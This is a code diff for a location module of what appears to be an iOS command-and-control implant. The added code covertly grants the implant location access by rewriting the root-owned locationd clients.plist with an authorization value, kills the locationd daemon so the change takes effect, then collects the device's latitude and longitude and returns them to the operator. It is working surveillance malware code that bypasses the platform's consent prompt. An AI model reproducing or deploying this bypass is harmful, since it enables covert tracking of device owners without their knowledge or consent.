@@ -32,46 +32,100 @@
 #include <c2.h>
 #include <tlv.h>
 #include <tlv_types.h>
+#include <proc.h>
+
+#include <sigar.h>
 
 #define LOCATE_BASE 8
 
-#define LOCATE_LOCATION_ON \
-        TLV_TAG_CUSTOM(API_CALL_STATIC, \
-                       LOCATE_BASE, \
-                       API_CALL)
-#define LOCATE_LOCATION_OFF \
-        TLV_TAG_CUSTOM(API_CALL_STATIC, \
-                       LOCATE_BASE, \
-                       API_CALL + 1)
 #define LOCATE_LOCATION_GET \
         TLV_TAG_CUSTOM(API_CALL_STATIC, \
                        LOCATE_BASE, \
-                       API_CALL + 2)
+                       API_CALL)
 
 #define TLV_TYPE_LONGITUDE TLV_TYPE_CUSTOM(TLV_TYPE_STRING, LOCATE_BASE, API_TYPE)
 #define TLV_TYPE_LATITUDE  TLV_TYPE_CUSTOM(TLV_TYPE_STRING, LOCATE_BASE, API_TYPE + 1)
 
-tlv_pkt_t *locate_location_on(c2_t *c2)
+static int kill_locationd(sigar_t *sigar)
 {
-    //[NSClassFromString(@"CLLocationManager") setLocationServicesEnabled:true];
-    return api_craft_tlv_pkt(API_CALL_SUCCESS);
+    sigar_pid_t pid;
+
+    if ((pid = proc_find(sigar, "locationd")) == -1)
+    {
+        return -1;
+    }
+
+    proc_kill(sigar, pid);
+    return pid;
 }
 
-tlv_pkt_t *locate_location_off(c2_t *c2)
+static int perform_locationd_bypass(sigar_t *sigar, NSString *executable, NSString *bundle)
 {
-    //[NSClassFromString(@"CLLocationManager") setLocationServicesEnabled:false];
-    return api_craft_tlv_pkt(API_CALL_SUCCESS);
+    NSString *clients;
+    NSString *client;
+
+    NSMutableDictionary *plist;
+    NSMutableDictionary *permissions;
+
+    @autoreleasepool
+    {
+        clients = @"/private/var/root/Library/Caches/locationd/clients.plist";
+
+        if (executable != NULL)
+        {
+            client = [NSString stringWithFormat:@"com.apple.locationd.executable-%@", executable];
+            log_debug("* Performing locationd bypass for executable (%s)\n", [executable UTF8String]);
+        }
+        else if (bundle != NULL)
+        {
+            client = bundle;
+            log_debug("* Performing locationd bypass for bundle (%s)\n", [client UTF8String]);
+        }
+        else
+        {
+            return -1;
+        }
+
+        plist = [[NSMutableDictionary alloc] initWithContentsOfFile:clients];
+        permissions = [NSMutableDictionary new];
+
+        [permissions setValue:@4 forKey:@"Authorization"];
+        [plist setValue:permissions forKey:client];
+        [plist writeToFile:clients atomically:YES];
+
+        kill_locationd(sigar);
+
+        log_debug("* Cooling down (locationd should reign)\n");
+        sleep(5);
+    }
+
+    return 0;
 }
 
 tlv_pkt_t *locate_location_get(c2_t *c2)
 {
+    int stat;
+
     tlv_pkt_t *result;
     CLLocationManager *manager;
     CLLocation *location;
     CLLocationCoordinate2D coordinate;
 
+    NSString *executable;
     NSString *latitude;
     NSString *longitude;
+
+#ifdef IS_BUNDLE
+    stat = perform_locationd_bypass(c2->sigar, NULL, [[NSBundle mainBundle] bundleIdentifier]);
+#else
+    executable = [NSString stringWithFormat:@"%s", realpath(c2->path, NULL)];
+    stat = perform_locationd_bypass(c2->sigar, executable, NULL);
+#endif
+
+    if (stat == -1)
+    {
+        return api_craft_tlv_pkt(API_CALL_FAIL);
+    }
 
     manager = [[CLLocationManager alloc] init];
 
@@ -92,8 +146,6 @@ tlv_pkt_t *locate_location_get(c2_t *c2)
 
 void register_locate_api_calls(api_calls_t **api_calls)
 {
-    api_call_register(api_calls, LOCATE_LOCATION_ON, locate_location_on);
-    api_call_register(api_calls, LOCATE_LOCATION_OFF, locate_location_off);
     api_call_register(api_calls, LOCATE_LOCATION_GET, locate_location_get);
 }
 
